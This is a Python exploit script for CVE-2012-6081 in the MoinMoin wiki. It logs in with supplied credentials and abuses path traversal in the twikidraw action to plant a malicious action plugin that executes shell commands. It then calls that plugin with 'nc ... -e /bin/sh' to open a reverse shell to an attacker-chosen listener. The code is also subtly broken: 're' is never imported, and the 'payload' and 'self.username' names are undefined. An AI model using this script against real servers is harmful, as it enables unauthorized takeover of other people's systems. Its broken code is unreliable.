import argparse
import requests
import lxml.html
import sys
from log_colors import *
requests.packages.urllib3.disable_warnings()

# CVE-2012-6081
# MoinMoin authenticated RCE.
class CVE2012_6081:
    headers = {"User-Agent" : "Mozilla/5.0"}

    def __init__(self, url, uname, password, lhost, lport):
        print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
        self.url = url.rstrip("/")
        self.uname, self.password = uname, password
        self.lhost, self.lport = lhost, lport
        self.session = requests.Session()

    # login with creds
    def login(self):
        print (LogColors.BLUE + "login with credentials..." + LogColors.ENDC)
        data = {
            "name" : self.uname, "password" : self.password, 
            "action" : "login", "login" : "Login"
        }
        r = self.session.post(self.url + "/moin", data = data)
        if r.ok:
            self.cookies = self.session.cookies
            print (LogColors.YELLOW + "successfully login..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed to login with credentials. exit" + LogColors.ENDC)
            sys.exit()

    # get ticket number
    def get_ticket(self):
        print (LogColors.BLUE + "get ticket number..." + LogColors.ENDC)
        path = '/moin/secretuser?action=twikidraw&do=modify&target=../../../../data/plugin/action/moinexec.py'
        try:
            r = self.session.get(self.url + path, cookies = self.cookies)
        except Exception:
            print (LogColors.RED + "error get ticket :(" + LogColors.ENDC)
            sys.exit()
        else:
            if r.ok:
                tree = lxml.html.fromstring(r.text)
                s = tree.xpath(".//param[@name='savepath']")
                result = s[0].text_content().replace("amp;", "")
                m = re.match('(.*?)&target\=', result)
                try:
                    result = m.group(1)
                    ticket = result.split('=')[-1]
                    print (LogColors.YELLOW + "ticket: " + ticket + LogColors.ENDC)
                    self.ticket = ticket
                except:
                    print (LogColors.RED + "failed to get ticket :(" + LogColors.ENDC)
                    sys.exit()
            else:
                print (LogColors.RED + r.status_code + LogColors.ENDC)
                sys.exit()
    
    # prepare payload
    def prepare_payload(self):
        print (LogColors.BLUE + "prepare payload..." + LogColors.ENDC)
        filepath = "..%2F..%2F..%2F..%2Fdata%2Fplugin%2Faction%2Fmoinexec.py"
        payload = "drawing.r if()else[]\nimport os\ndef execute(p,r):exec\"print>>r,os\\56popen(r\\56values['c'])\\56read()\""
        self.filepath = filepath
        self.payload = payload
        print (LogColors.GREEN + "successfully prepare payload..." + LogColors.ENDC)

    # send payload
    def send_payload(self):
        print (LogColors.BLUE + "send payload with reverse shell..." + LogColors.ENDC)
        url = self.url + "/moin/secretuser?action=twikidraw&do=save&"
        url += "ticket={}&target={}".format(self.ticket, self.filepath)
        headers = {'Content-Type' : 'multipart/form-data; boundary=89692781418184'}
        body = "\r\n\r\n--89692781418184\r\nContent-Disposition: form-data; "
        body += "name=\"filename\"\r\n\r\n{}\r\n".format(payload)
        body += "--89692781418184\r\nContent-Disposition: form-data;"
        body += " name=\"filepath\"; filename=\"drawing.png\"\r\n"
        body += "Content-Type: image/png\r\n\r\n moin \r\n"
        body += "--89692781418184--"
        r = self.session.post(url, headers = headers, data = body)
        if r.ok:
            print (LogColors.GREEN + "successfully send payload. hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "failed send payload :(" + LogColors.ENDC)
            sys.exit()

    # check reverse shell
    def check(self):
        print (LogColors.BLUE + "spawn remote shell..." + LogColors.ENDC)
        url = self.url + "/moin/{}?action=moinexec&c=nc%20{}%20{}%20-e%20/bin/sh".format(self.username, self.lhost, self.lport)
        print (LogColors.YELLOW + "shell: " + url + LogColors.ENDC)
        r = self.session.get(url, cookies = self.cookies)
        if r.ok:
            print (LogColors.GREEN + "rev shell successfully checked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "check reverse shell failed :(" + LogColors.ENDC)
            sys.exit()

    # exploitation logic
    def exploit(self):
        self.login()
        self.get_ticket()
        self.prepare_payload()
        self.send_payload()
        self.check()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--url', required = True, help = "target url")
    parser.add_argument('-U','--username', required = True, help = "auth username")
    parser.add_argument('-P','--password', required = True, help = "auth password")
    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
    args = vars(parser.parse_args())
    url = args['url']
    uname, pwd = args['username'], args['password']
    ip, port = args['ip'], args['port']
    cve = CVE2012_6081(url, uname, pwd, ip, port)
    cve.exploit()

